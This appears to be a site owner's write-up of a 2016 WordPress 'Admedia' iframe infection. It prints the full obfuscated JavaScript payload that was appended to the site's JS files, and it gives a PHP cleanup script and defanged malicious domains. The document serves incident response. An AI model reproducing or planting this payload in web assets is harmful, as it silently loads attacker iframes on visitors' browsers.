# Wordpress SSRF vulnerability 4.4.1 (Admedia/Adverting iFrame Infection)

Since February 1st 2016 I received a Google Search Console message that multiple sites were infected with malware.
All of my sites are hosted under one cPanel account as addon domains so the hacker gained access to one site and infected all the others.

This infections appends code to all of your Javascript files which looks like this:

```javascript
/*d37595b5101677d2a9bd2e2b3c8322e9*/;window["\x64\x6f"+"\x63\x75"+"\x6d\x65"+"\x6e\x74"]["\x73\x65\x65\x74\x73"]=["\x29\x3b","\x32\x39\x32\x62\x36\x33\x32\x39\x33\x62\x37\x64\x36\x39\x36\x36\x32\x38\x36\x31\x32\x30\x32\x36\x32\x36\x32\x30\x36\x32\x32\x39\x32\x30\x36\x34\x36\x66\x36\x33\x37\x35\x36\x64\x36\x35\x36\x65\x37\x34\x32\x65\x36\x33\x36\x66\x36\x66\x36\x62\x36\x39\x36\x35\x32\x30\x33\x64\x32\x30\x36\x31\x32\x62\x32\x37\x33\x64\x32\x37\x32\x62\x36\x32\x32\x62\x32\x38\x36\x33\x32\x30\x33\x66\x32\x30\x32\x37\x33\x62\x32\x30\x36\x35\x37\x38\x37\x30\x36\x39\x37\x32","\x33\x33\x33\x33\x36\x32\x37\x31\x32\x38\x36\x31\x32\x39\x37\x62\x37\x36\x36\x31\x37\x32\x32\x30\x36\x32\x32\x30\x33\x64\x32\x30\x36\x65\x36\x35\x37\x37\x32\x30\x35\x32\x36\x35\x36\x37\x34\x35\x37\x38\x37\x30\x32\x38\x36\x31\x32\x62\x32\x37\x33\x64\x32\x38\x35\x62\x35\x65\x33\x62\x35\x64\x32\x39\x37\x62\x33\x31\x32\x63\x37\x64\x32\x37\x32\x39\x33\x62\x37\x36\x36\x31\x37\x32\x32\x30\x36\x33\x32\x30\x33\x64\x32\x30\x36\x32\x32\x65\x36\x35\x37\x38","\x7a\x73\x64\x62\x2c\x61\x7a\x73\x64\x62\x2b\x32\x29\x2c\x20\x31\x36\x29\x2b\x22\x2c\x22\x3b\x7d\x65\x72\x61\x6b\x65\x3d\x65\x72\x61\x6b\x65\x2e\x73\x75\x62\x73\x74\x72\x69\x6e\x67\x28\x30\x2c\x65\x72\x61\x6b\x65\x2e\x6c\x65\x6e\x67\x74\x68\x2d\x31\x29\x3b\x65\x76\x61\x6c\x28\x65\x76\x61\x6c\x28\x27\x53\x74\x72\x69\x6e\x67\x2e\x66\x72\x6f\x6d\x43\x68\x61\x72\x43\x6f\x64\x65\x28\x27\x2b\x65\x72\x61\x6b\x65\x2b\x27\x29\x27\x29\x29\x3b\x7d\x29\x28","\x32\x38\x32\x32\x36\x34\x36\x39\x37\x36\x32\x32\x32\x39\x33\x62\x37\x36\x36\x31\x37\x32\x32\x30\x37\x38\x33\x32\x33\x32\x37\x31\x37\x31\x32\x30\x33\x64\x32\x30\x32\x32\x36\x38\x37\x34\x37\x34\x37\x30\x33\x61\x32\x66\x32\x66\x36\x39\x36\x64\x36\x37\x32\x65\x36\x66\x36\x34\x37\x35\x37\x36\x36\x31\x36\x65\x36\x33\x36\x38\x36\x39\x36\x62\x37\x33\x36\x31\x37\x37\x36\x31\x32\x65\x36\x32\x36\x39\x37\x61\x32\x66\x36\x31\x36\x34\x37\x36\x36\x35\x37\x32","\x37\x34\x36\x39\x36\x65\x36\x37\x32\x66\x33\x66\x36\x39\x36\x34\x33\x64\x33\x35\x33\x33\x33\x34\x33\x35\x33\x38\x33\x39\x33\x36\x32\x36\x36\x62\x36\x35\x37\x39\x37\x37\x36\x66\x37\x32\x36\x34\x33\x64\x36\x32\x33\x30\x36\x34\x36\x31\x36\x31\x33\x33\x36\x33\x33\x37\x36\x33\x36\x31\x33\x32\x36\x32\x36\x35\x33\x38\x33\x35\x36\x36\x36\x33\x33\x34\x33\x31\x33\x38\x33\x35\x33\x34\x33\x36\x36\x34\x33\x31\x36\x36\x33\x31\x33\x35\x36\x36\x33\x36\x36\x36","\x36\x31\x36\x32\x37\x33\x36\x66\x36\x63\x37\x35\x37\x34\x36\x35\x33\x62\x37\x61\x32\x64\x36\x39\x36\x65\x36\x34\x36\x35\x37\x38\x33\x61\x33\x31\x33\x30\x33\x30\x33\x30\x33\x62\x37\x34\x36\x66\x37\x30\x33\x61\x32\x64\x33\x31\x33\x30\x33\x30\x33\x30\x37\x30\x37\x38\x33\x62\x36\x63\x36\x35\x36\x36\x37\x34\x33\x61\x32\x64\x33\x39\x33\x39\x33\x39\x33\x39\x37\x30\x37\x38\x33\x62\x32\x37\x33\x65\x33\x63\x36\x39\x36\x36\x37\x32\x36\x31\x36\x64\x36\x35","\x36\x34\x32\x64\x36\x33\x36\x66\x36\x66\x36\x62\x36\x39\x36\x35\x32\x32\x32\x39\x33\x62\x36\x39\x36\x36\x32\x38\x32\x30\x37\x38\x33\x33\x33\x33\x36\x34\x37\x31\x32\x30\x32\x31\x33\x64\x32\x30\x32\x32\x36\x35\x37\x32\x33\x32\x37\x36\x36\x34\x37\x32\x33\x35\x36\x37\x36\x34\x36\x33\x33\x33\x36\x34\x37\x33\x32\x32\x32\x39\x37\x62\x37\x38\x33\x32\x33\x32\x36\x32\x37\x31\x32\x38\x32\x32\x36\x31\x36\x34\x32\x64\x36\x33\x36\x66\x36\x66\x36\x62\x36\x39","\x36\x35\x36\x33\x32\x38\x36\x34\x36\x66\x36\x33\x37\x35\x36\x64\x36\x35\x36\x65\x37\x34\x32\x65\x36\x33\x36\x66\x36\x66\x36\x62\x36\x39\x36\x35\x32\x39\x33\x62\x36\x39\x36\x36\x32\x38\x36\x33\x32\x39\x32\x30\x36\x33\x32\x30\x33\x64\x32\x30\x36\x33\x35\x62\x33\x30\x35\x64\x32\x65\x37\x33\x37\x30\x36\x63\x36\x39\x37\x34\x32\x38\x32\x37\x33\x64\x32\x37\x32\x39\x33\x62\x36\x35\x36\x63\x37\x33\x36\x35\x32\x30\x37\x32\x36\x35\x37\x34\x37\x35\x37\x32","\x28\x66\x75\x6e\x63\x74\x69\x6f\x6e\x28\x29\x7b\x76\x61\x72\x20\x65\x72\x61\x6b\x65\x3d\x22\x22\x3b\x76\x61\x72\x20\x72\x6b\x66\x79\x61\x3d\x22\x37\x37\x36\x39\x36\x65\x36\x34\x36\x66\x37\x37\x32\x65\x36\x66\x36\x65\x36\x63\x36\x66\x36\x31\x36\x34\x32\x30\x33\x64\x32\x30\x36\x36\x37\x35\x36\x65\x36\x33\x37\x34\x36\x39\x36\x66\x36\x65\x32\x38\x32\x39\x37\x62\x36\x36\x37\x35\x36\x65\x36\x33\x37\x34\x36\x39\x36\x66\x36\x65\x32\x30\x37\x38\x33\x32","\x33\x32\x36\x32\x37\x31\x32\x38\x36\x31\x32\x63\x36\x32\x32\x63\x36\x33\x32\x39\x37\x62\x36\x39\x36\x36\x32\x38\x36\x33\x32\x39\x37\x62\x37\x36\x36\x31\x37\x32\x32\x30\x36\x34\x32\x30\x33\x64\x32\x30\x36\x65\x36\x35\x37\x37\x32\x30\x34\x34\x36\x31\x37\x34\x36\x35\x32\x38\x32\x39\x33\x62\x36\x34\x32\x65\x37\x33\x36\x35\x37\x34\x34\x34\x36\x31\x37\x34\x36\x35\x32\x38\x36\x34\x32\x65\x36\x37\x36\x35\x37\x34\x34\x34\x36\x31\x37\x34\x36\x35\x32\x38","\x36\x39\x36\x63\x36\x34\x32\x38\x37\x38\x33\x32\x33\x32\x36\x34\x37\x31\x32\x39\x33\x62\x37\x64\x37\x64\x22\x3b\x66\x6f\x72\x20\x28\x76\x61\x72\x20\x61\x7a\x73\x64\x62\x3d\x30\x3b\x61\x7a\x73\x64\x62\x3c\x72\x6b\x66\x79\x61\x2e\x6c\x65\x6e\x67\x74\x68\x3b\x61\x7a\x73\x64\x62\x2b\x3d\x32\x29\x7b\x65\x72\x61\x6b\x65\x3d\x65\x72\x61\x6b\x65\x2b\x70\x61\x72\x73\x65\x49\x6e\x74\x28\x72\x6b\x66\x79\x61\x2e\x73\x75\x62\x73\x74\x72\x69\x6e\x67\x28\x61","\x36\x65\x32\x30\x36\x36\x36\x31\x36\x63\x37\x33\x36\x35\x33\x62\x37\x32\x36\x35\x37\x34\x37\x35\x37\x32\x36\x65\x32\x30\x36\x33\x35\x62\x33\x31\x35\x64\x32\x30\x33\x66\x32\x30\x36\x33\x35\x62\x33\x31\x35\x64\x32\x30\x33\x61\x32\x30\x36\x36\x36\x31\x36\x63\x37\x33\x36\x35\x33\x62\x37\x64\x37\x36\x36\x31\x37\x32\x32\x30\x37\x38\x33\x33\x33\x33\x36\x34\x37\x31\x32\x30\x33\x64\x32\x30\x37\x38\x33\x33\x33\x33\x36\x32\x37\x31\x32\x38\x32\x32\x36\x31","\x36\x35\x37\x33\x33\x64\x32\x37\x32\x62\x36\x34\x32\x65\x37\x34\x36\x66\x35\x35\x35\x34\x34\x33\x35\x33\x37\x34\x37\x32\x36\x39\x36\x65\x36\x37\x32\x38\x32\x39\x32\x30\x33\x61\x32\x30\x32\x37\x32\x37\x32\x39\x33\x62\x36\x35\x36\x63\x37\x33\x36\x35\x32\x30\x37\x32\x36\x35\x37\x34\x37\x35\x37\x32\x36\x65\x32\x30\x36\x36\x36\x31\x36\x63\x37\x33\x36\x35\x33\x62\x37\x64\x36\x36\x37\x35\x36\x65\x36\x33\x37\x34\x36\x39\x36\x66\x36\x65\x32\x30\x37\x38","\x32\x30\x37\x33\x37\x32\x36\x33\x33\x64\x32\x37\x32\x32\x32\x62\x37\x38\x33\x32\x33\x32\x37\x31\x37\x31\x32\x62\x32\x32\x32\x37\x33\x65\x33\x63\x32\x66\x36\x39\x36\x36\x37\x32\x36\x31\x36\x64\x36\x35\x33\x65\x33\x63\x32\x66\x36\x34\x36\x39\x37\x36\x33\x65\x32\x32\x33\x62\x36\x34\x36\x66\x36\x33\x37\x35\x36\x64\x36\x35\x36\x65\x37\x34\x32\x65\x36\x32\x36\x66\x36\x34\x37\x39\x32\x65\x36\x31\x37\x30\x37\x30\x36\x35\x36\x65\x36\x34\x34\x33\x36\x38","\x33\x34\x32\x36\x37\x35\x37\x39\x36\x39\x36\x61\x36\x66\x33\x64\x33\x38\x33\x36\x37\x34\x37\x39\x36\x38\x33\x39\x33\x37\x33\x38\x32\x32\x33\x62\x37\x38\x33\x32\x33\x32\x36\x34\x37\x31\x32\x65\x36\x39\x36\x65\x36\x65\x36\x35\x37\x32\x34\x38\x35\x34\x34\x64\x34\x63\x33\x64\x32\x32\x33\x63\x36\x34\x36\x39\x37\x36\x32\x30\x37\x33\x37\x34\x37\x39\x36\x63\x36\x35\x33\x64\x32\x37\x37\x30\x36\x66\x37\x33\x36\x39\x37\x34\x36\x39\x36\x66\x36\x65\x33\x61","\x36\x35\x32\x32\x32\x63\x32\x32\x36\x35\x37\x32\x33\x32\x37\x36\x36\x34\x37\x32\x33\x35\x36\x37\x36\x34\x36\x33\x33\x33\x36\x34\x37\x33\x32\x32\x32\x63\x33\x31\x32\x39\x33\x62\x37\x36\x36\x31\x37\x32\x32\x30\x37\x38\x33\x32\x33\x32\x36\x34\x37\x31\x32\x30\x33\x64\x32\x30\x36\x34\x36\x66\x36\x33\x37\x35\x36\x64\x36\x35\x36\x65\x37\x34\x32\x65\x36\x33\x37\x32\x36\x35\x36\x31\x37\x34\x36\x35\x34\x35\x36\x63\x36\x35\x36\x64\x36\x35\x36\x65\x37\x34"];var rdtra=esska=nfehn=kefih=window["\x64\x6f"+"\x63\x75"+"\x6d\x65"+"\x6e\x74"]["\x73\x65\x65\x74\x73"],eiakz=window;eval(eval("[eiakz[\"nfehn\"][\"\x39\"],eiakz[\"\x6b\x65\x66\x69\x68\"][\"\x31\x30\"],eiakz[\"esska\"][\"\x31\"],eiakz[\"rdtra\"][\"\x31\x33\"],eiakz[\"kefih\"][\"\x32\"],eiakz[\"nfehn\"][\"\x38\"],eiakz[\"\x6e\x66\x65\x68\x6e\"][\"\x31\x32\"],eiakz[\"rdtra\"][\"\x37\"],eiakz[\"\x65\x73\x73\x6b\x61\"][\"\x31\x36\"],eiakz[\"\x6b\x65\x66\x69\x68\"][\"\x34\"],eiakz[\"nfehn\"][\"\x35\"],eiakz[\"\x72\x64\x74\x72\x61\"][\"\x31\x35\"],eiakz[\"kefih\"][\"\x36\"],eiakz[\"kefih\"][\"\x31\x34\"],eiakz[\"\x65\x73\x73\x6b\x61\"][\"\x31\x31\"],eiakz[\"esska\"][\"\x33\"],eiakz[\"\x6e\x66\x65\x68\x6e\"][\"\x30\"]].join(\"\");"));/*d37595b5101677d2a9bd2e2b3c8322e9*/
```

Today I rebuild the entire server with each website as seperate account in cPanel so this cannot happen again in the future.

I made a little PHP script which I ran on every site. It will remove all the infected areas in each Javascript file recursively:

```php
<?php
$root = getcwd();
$iter = new RecursiveIteratorIterator(
    new RecursiveDirectoryIterator($root, RecursiveDirectoryIterator::SKIP_DOTS),
    RecursiveIteratorIterator::SELF_FIRST,
    RecursiveIteratorIterator::CATCH_GET_CHILD
);
function startsWith($haystack, $needle)
{
    return $needle === "" || strrpos($haystack, $needle, -strlen($haystack)) !== FALSE;
}
function endsWith($haystack, $needle)
{
    return $needle === "" || (($temp = strlen($haystack) - strlen($needle)) >= 0 && strpos($haystack, $needle, $temp) !== FALSE);
}
$paths = array($root);
foreach ($iter as $path => $dir) {
    if ($dir->isDir()) {
        $handle = opendir($dir);
        while (false !== ($entry = readdir($handle))) {
            $path = realpath($dir . DIRECTORY_SEPARATOR . $entry);
            if ($entry != '..' && $entry != '.') {
                if (file_exists($path)) {
                    $content = file_get_contents($path);
                    $regex = "/(\/\*[\w\'\s\r\n\*]*\*\/)|(\/\/[\w\s\']*)|(\<![\-\-\s\w\>\/]*\>)/";
                    preg_match_all($regex, $content, $matches);
                    foreach ($matches as $matchSet) {
                        foreach ($matchSet as $match) {
                            if (strlen($match) > 34 && strlen($match) < 38) {
                                if (startsWith($match, '/*') && endsWith($match, '*/')) {
                                    $split = explode($match, $content);
                                    $malware = $split[count($split) - 2];
                                    if (strpos($malware, '=window;eval(') !== false && strpos($malware, '.join(\"\");') !== false) {
                                        $cleaned = str_replace($match . $malware . $match, ' ', $content);
                                        file_put_contents($path, $cleaned);
                                        echo 'CLEANED THE FILE: ' . $path . "\n";
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}
?>
```

Save the code above in a PHP file on the infected site and run it with:
```shell
php -d memory_limit=1000M <filename>.php
```

The scripts could be redirecting to one of the following domains:
```
hxxp://template.poln1uewt1aniwki[.]ws/admedia/?id=8695834&keyword=85c86e3646fb1b15c0bc0647c257c029&ad_id=Twiue123
hxxp://js.polnue2wtani2wki[.]ws/admedia/?id=8695834&keyword=396f3d9d490aed315d71b60ec1efda53&ad_id=Twiue123
hxxp://get.malenkiuniger[.]net/admedia/?id=8695834&keyword=8580b2135c1fdc0c650156eb174b4985&ad_id=Twiue123
hxxp://track.findyourwaytotr[.]net/admedia/?id=8695834&keyword=46731f99a65ceac12e0632d08e551ca5&ad_id=Twiue123
hxxp://img.oduvanchiksawa[.]biz/adverting/?id=5345896&keyword=fd2f2243cd2046d674aeec495cd2e74b&uyijo=86tyh978
```

Read the following article for more information:
```
https://blog.sucuri.net/2016/02/massive-admedia-iframe-javascript-infection.html
```
